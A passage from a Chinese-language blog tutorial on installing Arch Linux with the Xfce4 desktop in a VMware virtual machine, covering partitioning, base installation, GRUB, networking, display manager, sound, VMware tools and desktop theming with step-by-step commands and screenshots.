alt="在这里插入图片描述"></p><h3 id="创建分区"><a href="#创建分区" class="headerlink" title="创建分区"></a>创建分区</h3><p>使用<code>n</code>命令创建一个新分区。您输入分区类型，分区号，起始扇区和终止扇区。<br>出现提示时，请指定分区类型，然后键入<code>p</code>以创建主分区或<code>e</code>创建扩展分区。最多可以有四个主分区。<br>全部操作如下：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214646.png" alt="在这里插入图片描述"><br>上面是我设置的分区大小，仅供参考，可以根据你的需要自行调整。</p><blockquote><p>使用说明：<br><strong>列出分区类型</strong> 按下<code>l</code>以列出可用的分区类型。 查询完需要返回就按<code>q</code><br><strong>更改分区类型</strong> 每个分区都与Type关联。按<code>t</code>更改分区的类型。默认值，Linux filesystem对于大多数使用来说应该没问题。<br><strong>使分区可启动。</strong> 您可以通过键入使分区可启动<code>a</code>。</p><p><strong>将更改写入磁盘</strong> 将表写入磁盘，然后通过<code>w</code>命令退出。</p></blockquote><p><strong>将第一个300MB的分区的分区类型设置为<code>EFI System</code></strong><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326151621759.png" alt="在这里插入图片描述"></p><p><strong>将第2个2GB的分区的分区类型设置为<code>Linux Swap</code></strong><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326151645359.png" alt="在这里插入图片描述"></p><p>将更改写入磁盘 将表写入磁盘，然后通过<code>w</code>命令退出。<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326115617731.png" alt="在这里插入图片描述"><br>这时已经分区成功了，现在来查一下分区结构：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214647.png" alt="在这里插入图片描述"></p><blockquote><p>疑问： 我EFI分区对应的是<code>/dev/sda1</code> 官方文档中写的路径是<code>/dev/efi_system_partition</code><br>这样的设备路径是怎么创建的？知道的朋友麻烦评论告诉我。我找了一圈，还是不知道如何做。暂时先不官这个了，继续做吧。</p></blockquote><h3 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h3><p>创建分区后，必须使用适当的文件系统格式化每个新创建的分区。例如，要在创建一个Ext4文件系统。<br>用于<code>/</code> 和 <code>/home</code>的分区格式化成ext4类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs.ext4 /dev/sda3<br>mkfs.ext4 /dev/sda4<br></code></pre></td></tr></table></figure><p>EFI分区格式化成vfat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs.vfat /dev/sda1<br></code></pre></td></tr></table></figure><p>如果您创建了交换分区，请使用mkswap（8）对其进行初始化：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap -f /dev/sda2<br></code></pre></td></tr></table></figure><h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326153152193.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载swap</span><br>swapon /dev/sda2<br>mount /dev/sda3 /mnt<br><span class="hljs-built_in">mkdir</span> /mnt/home<br>mount /dev/sda4 /mnt/home<br><span class="hljs-built_in">mkdir</span> /mnt/boot<br><span class="hljs-built_in">mkdir</span> /mnt/boot/EFI<br>mount /dev/sda1 /mnt/boot/EFI<br></code></pre></td></tr></table></figure><blockquote><p>分区总结：fdisk分区虽然没有图形化的直观，用过一次感觉很爽，甚至比图形化的更爽！</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>基础包</p><p><strong>这里装了两次才装上，不知道为啥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacstrap /mnt base base-devel linux linux-firmware  <span class="hljs-comment">#base-devel在AUR包的安装是必须的</span><br></code></pre></td></tr></table></figure><p>如果你这一步特别久，请检查一下是不是国内镜像源设置的有问题。我一开始没设置特别慢，等待了1个多小时，实在等不下去，又重新安装的。速度如下：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214658.png" alt="在这里插入图片描述"></p><p>功能性软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacstrap /mnt dhcpcd iwd vim sudo bash-completion   <span class="hljs-comment">#一个有线所需 一个无线所需 一个编辑器  一个提权工具 一个补全工具 iwd也需要dhcpcd</span><br></code></pre></td></tr></table></figure><h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><h3 id="Fstab"><a href="#Fstab" class="headerlink" title="Fstab"></a>Fstab</h3><p>生成一个fstab文件（分别使用-U或-L定义UUID或标签）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p>检查生成的<code>/mnt/etc/fstab</code>文件，并在出现错误的情况下对其进行编辑。</p><h3 id="Chroot"><a href="#Chroot" class="headerlink" title="Chroot"></a>Chroot</h3><p>将root更改为新系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arch-chroot /mnt<br></code></pre></td></tr></table></figure><h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/2021032615471787.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br></code></pre></td></tr></table></figure><h3 id="将系统时间同步到硬件时间"><a href="#将系统时间同步到硬件时间" class="headerlink" title="将系统时间同步到硬件时间"></a>将系统时间同步到硬件时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hwclock --systohc<br></code></pre></td></tr></table></figure><h3 id="设置-Locale"><a href="#设置-Locale" class="headerlink" title="设置 Locale"></a>设置 Locale</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/locale.gen<br></code></pre></td></tr></table></figure><p>，去掉 en_US.UTF-8 行以及 zh_CN.UTF-8 的注释符号（#）。<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214659.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326155831170.png" alt="在这里插入图片描述"><br>配置完成以后运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">locale-gen<br></code></pre></td></tr></table></figure><p>生成 locale。</p><p>向 &#x2F;etc&#x2F;locale.conf 输入内容</p><p>根据自己需要选择环境，二选一。我更喜欢中文的。<br>英文环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;LANG=en_US.UTF-8&#x27;</span>  &gt; /etc/locale.conf<br></code></pre></td></tr></table></figure><p>中文环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;LANG=zh_CN.UTF-8&#x27;</span>  &gt; /etc/locale.conf<br></code></pre></td></tr></table></figure><h2 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S intel-ucode   <span class="hljs-comment">#Intel</span><br>pacman -S amd-ucode     <span class="hljs-comment">#AMD</span><br></code></pre></td></tr></table></figure><h2 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S grub efibootmgr   <span class="hljs-comment">#grub是启动引导器，efibootmgr被 grub 脚本用来将启动项写入 NVRAM。</span><br>grub-install --target=x86_64-efi --efi-directory=/boot/EFI --bootloader-id=GRUB <span class="hljs-comment">#取名为GRUB 并将grubx64.efi安装到之前的指定位置</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326162228979.png" alt="在这里插入图片描述"><br>最后生成 GRUB 所需的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326162502500.png" alt="在这里插入图片描述"></p><h2 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h2><p>设置root的密码!!! 不能忘记这一步，否则重启无法登录啦。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd root<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span>                <span class="hljs-comment"># 退回安装环境#</span><br>umount -R  /mnt     <span class="hljs-comment"># 卸载新分区</span><br>reboot              <span class="hljs-comment"># 重启</span><br></code></pre></td></tr></table></figure><p>重启以后就可以正常启动了，安装完成。</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>安装完成后，发现网络不通。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> dhcpcd  <span class="hljs-comment">#设置开机启动</span><br>systemctl start dhcpcd  <span class="hljs-comment">#立即启动dhcp</span><br></code></pre></td></tr></table></figure><p>等待一会儿，<code>ping www.baidu.com</code> 发现网络已经通了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S neofetch<br>neofetch<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-165105142146510.png" alt="在这里插入图片描述"></p><h2 id="中文字体"><a href="#中文字体" class="headerlink" title="中文字体"></a>中文字体</h2><p>我选择<code>ttf-droid</code>，这个是我看着最顺眼的。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S ttf-droid</span><br></code></pre></td></tr></table></figure><p>顺便扔一个如何查看自己的arch上安装的中文字体。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fc-list <span class="hljs-symbol">:lang=zh</span><br></code></pre></td></tr></table></figure><h1 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h1><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a><strong>显卡驱动</strong></h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs clean"># lspci | grep VGA    # 确定显卡型号<br># pacman -S &lt;驱动包&gt;<br>#<br># # 官方仓库提供的驱动包：<br># # +----------------------+--------------------+--------------+<br># # |                      |        开源        |     私有     |<br># # +----------------------+--------------------+--------------+<br># # |         通用         |   xf86-video-vesa  |              |<br># # +----------------------+--------------------+--------------+<br># # |         Intel        |  xf86-video-intel  |              |<br># # +--------+-------------+--------------------+--------------+<br># # |        | GeForce <span class="hljs-number">9</span>+  |                    |    nvidia    |<br># # +        +-------------+                    +--------------+<br># # | nVidia | GeForce <span class="hljs-number">8</span>/<span class="hljs-number">9</span> | xf86-video-nouveau | nvidia<span class="hljs-number">-340</span>xx |<br># # +        +-------------+                    +--------------+<br># # |        | GeForce <span class="hljs-number">6</span>/<span class="hljs-number">7</span> |                    | nvidia<span class="hljs-number">-304</span>xx |<br># # +--------+-------------+--------------------+--------------+<br># # |        AMD/ATI       |   xf86-video-ati   |              |<br># # +----------------------+--------------------+--------------+<br></code></pre></td></tr></table></figure><h2 id="桌面环境"><a href="#桌面环境" class="headerlink" title="桌面环境"></a><strong>桌面环境</strong></h2><p>所有桌面环境都需要依赖xorg。所以先要安装xorg组。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S xorg</span><br></code></pre></td></tr></table></figure><p>输入命令之后首先会询问要安装xorg组下的哪些包，选择全部。然后对于libgl包有个四个不同的实现，选择mesa-libgl。<br>然后再安装xorg-xinit和xterm：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S xorg-xinit xterm</span><br></code></pre></td></tr></table></figure><p>安装完成之后就可以使用startx命令启动xorg的简易界面了。进入成功的话会显示出几个简陋的窗口。然后按Ctrl+D就可以退出了。</p><h2 id="xfce4桌面"><a href="#xfce4桌面" class="headerlink" title="xfce4桌面"></a><strong>xfce4桌面</strong></h2><p>安装xfce4桌面和附带的软件包：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pacman</span> -S xfce4 xfce4-goodies<br></code></pre></td></tr></table></figure><h2 id="LightDM登录管理器-显示管理器"><a href="#LightDM登录管理器-显示管理器" class="headerlink" title="LightDM登录管理器(显示管理器)"></a><strong>LightDM登录管理器(显示管理器)</strong></h2><p>详细安装和配置看arch-wiki-lighdm<br>我没有通过startx的方式启动桌面环境，而是使用了登录管理器lightdm<br>安装：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S lightdm lightdm-gtk-greeter lightdm-gtk-greeter-settings</span><br></code></pre></td></tr></table></figure><p>其配置文件为<code>/etc/lightdm/lightdm.conf</code></p><p>安装好之后测试启动：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> lightdm.service<br></code></pre></td></tr></table></figure><p>如果正常就会看到熟悉的登录界面了，不过不要登录，现在只是测试lightdm是否可以正常启动<br>点击画面上的关机小图标，弹出关机对话，选择注销!<br>注销之后就回到之前的tty命令行模式了，可以看到相关的启动信息<br>一切正常，所以设置lightdm为开机自动启动，这样以后开机就不会出现tty命令行界面了，而是直接进入登录界面：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> lightdm.service<br></code></pre></td></tr></table></figure><p>之后你可以重启进入xfce4图形界面，然后在图形界面中使用终端来继续以下配置步骤，也可以不重启，直接继续</p><h2 id="alsa-utils配置声音"><a href="#alsa-utils配置声音" class="headerlink" title="alsa-utils配置声音"></a><strong>alsa-utils配置声音</strong></h2><p>arch系统默认已经安装了alsa-libs支持库，可以支持xfce4中的混音器来控制系统的音量或者静音<br>但是系统每次关机重启之后，默认的都是静音，你之前调的音量全部消失，解决方法：<br>安装alsa-utils:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S alsa-utils</span><br></code></pre></td></tr></table></figure><p>编辑下alsa的服务(服务脚本有问题，不能由systemctl管理)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nano <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>alsa-state.service<br></code></pre></td></tr></table></figure><p>查看是否有”[Install]”(包含此字段)</p><p>[Install]<br>WantedBy&#x3D;multi-user.target</p><p>有的话就不用继续编辑了，没有的话在末尾加上上述字段，保存<br>然后启动服务，并允许其开机自启动：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">systemctl start alsa-<span class="hljs-section">state</span>.service<br>systemctl enable alsa-<span class="hljs-section">state</span>.service<br></code></pre></td></tr></table></figure><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>按照arch官方的wiki安装好系统后时间不对<br>官方不提倡使用软件同步系统时间，但是没办法，只有同步时间最方便，方法：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pacman -S<span class="hljs-built_in"> ntp</span><br><span class="hljs-built_in"></span>systemctl start ntpd.service<br>systemctl <span class="hljs-built_in">enable</span> ntpd.service<br></code></pre></td></tr></table></figure><p>等待几分钟之后系统时间就同步正确了</p><p>然后将本机硬件时间设置为同步好的系统时间</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">hwclock</span> <span class="hljs-literal">--</span><span class="hljs-comment">systohc</span> <span class="hljs-literal">--</span><span class="hljs-comment">localtime</span><br></code></pre></td></tr></table></figure><h2 id="VMware组件安装"><a href="#VMware组件安装" class="headerlink" title="VMware组件安装"></a>VMware组件安装</h2><p>这样就可以在虚拟机和物理机之间复制文件以及自由调整桌面大小了。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">pacman -S gtk2 gtkmm gtkmm3 xf86-<span class="hljs-built_in">input</span>-vmmouse xf86-video-vmware <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br></code></pre></td></tr></table></figure><p>VMware Tools 服务 vmtoolsd 需要配置为在引导时运行。使用以下命令执行操作：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> vmtoolsd<br></code></pre></td></tr></table></figure><h3 id="更新-initramfs-以包含-VMware-模块"><a href="#更新-initramfs-以包含-VMware-模块" class="headerlink" title="更新 initramfs 以包含 VMware 模块"></a>更新 initramfs 以包含 VMware 模块</h3><p>需要在 <code>/etc/mkinitcpio.conf</code> 文件中更新 <a href="https://wiki.archlinux.org/index.php/Mkinitcpio#MODULES">MODULES</a> 数组以便<a href="https://wiki.archlinux.org/index.php/VMware/Install_Arch_Linux_as_a_guest#Potential_solution_3">所需模块</a> 在启动时能被加载。按如下所示更新文件中的 <code>MODULES=()</code> :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">MODULES</span><span class="hljs-operator">=</span>(vsock vmw_vsock_vmci_transport vmw_balloon vmw_vmci vmwgfx)<br></code></pre></td></tr></table></figure><p>需要注意的是这是添加，不是替换，如果原有的MODULES不为空则追加即可。</p><p>在此编辑之后，生成一个新的 initramfs 映像：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mkinitcpio -<span class="hljs-selector-tag">P</span><br></code></pre></td></tr></table></figure><p>注意输出中出现的任何错误 - 这些模块名称很容易输入错误，这会在映像生成过程中引发错误。</p><h3 id="重启确认成功安装"><a href="#重启确认成功安装" class="headerlink" title="重启确认成功安装"></a>重启确认成功安装</h3><p>重启系统：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">shutdown -r <span class="hljs-built_in">now</span><br></code></pre></td></tr></table></figure><p>再次进入系统应该就能自由复制文件了，但是可能有个bug就是屏幕需要VMware至少进行一次虚拟机全屏操作后才能填满屏幕，目前还没找到解决方法。</p><h2 id="图标与主题美化"><a href="#图标与主题美化" class="headerlink" title="图标与主题美化"></a>图标与主题美化</h2><p><code>kali</code>重度用户选择用上<code>kali</code>的全套配置。</p><p>kali的主题和图标都是开源的，分别叫<code>flat-remix-gtk</code>和<code>flat-remix</code></p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs glsl">yay -S <span class="hljs-keyword">flat</span>-remix-gtk <span class="hljs-keyword">flat</span>-remix<br></code></pre></td></tr></table></figure><p>没有yay可以先安装yay：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S yay</span><br></code></pre></td></tr></table></figure><p>然后在外观中进行相应的配置即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428144613238.png" alt="image-20220428144613238"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428144631918.png" alt="image-20220428144631918"></p><h2 id="上Panel的优化"><a href="#上Panel的优化" class="headerlink" title="上Panel的优化"></a>上Panel的优化</h2><p>首先是用whisker插件替换原来的xfce应用程序管理器。方法是面板右键 &#x3D;&#x3D;&gt; 面板首选项，添加Whisker菜单，然后用Whisker菜单替换掉原来的菜单（先删除后往上挪）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428145957014.png" alt="image-20220428145957014"></p><p>之后就是上Panel很多细节的优化，这里我推荐是看着Kali的设置跟着走。具体要调整的地方太多，这里就不一一放了，总之最后完成如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428150319479.png" alt="image-20220428150319479"></p><h2 id="Dock"><a href="#Dock" class="headerlink" title="Dock"></a>Dock</h2><p>Xfce自带的dock太丑了，选择<code>plank</code>作为替代。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S plank</span><br></code></pre></td></tr></table></figure><p>安装完后先把自带的底部panel删掉，方式是在panel上右键删除即可。</p><p>然后需要配置以便桌面启动时plank能同步启动。方法如下：</p><p>首先打开 全部应用程序 &#x3D;&#x3D;&gt; 会话和启动：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428145302662.png" alt="image-20220428145302662"></p><p>然后在应用程序自启动中添加一个项目，名称无所谓，但命令一定是<code>plank</code>，触发器选择默认的<code>on login</code>即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428145342930.png" alt="image-20220428145342930"></p><p>新出来的plank可能会有一个阴影遮罩，我们需要把他去掉。方法是打开 设置 &#x3D;&#x3D;&gt; 窗口管理器微调：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428145640529.png" alt="image-20220428145640529"></p><p>然后将<code>在dock窗口下显示阴影</code>的√给去掉即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428145731895.png" alt="image-20220428145731895"></p><h2 id="桌面选择"><a href="#桌面选择" class="headerlink" title="桌面选择"></a>桌面选择</h2><p>这里选择了arch的官方壁纸。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S</span> <br></code></pre></td></tr></table></figure><p>安装完成后的壁纸位置在<code>/usr/share/backgrounds/archlinux</code>中。桌面右键自己操作替换即可，这个说的是桌面壁纸。</p><p>至于锁屏壁纸，则可以通过<code>LightDm 桌面管理器</code>设置，打开就知道该怎么做了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428200633767.png" alt="image-20220428200633767"></p><h1 id="一些优化"><a href="#一些优化" class="headerlink" 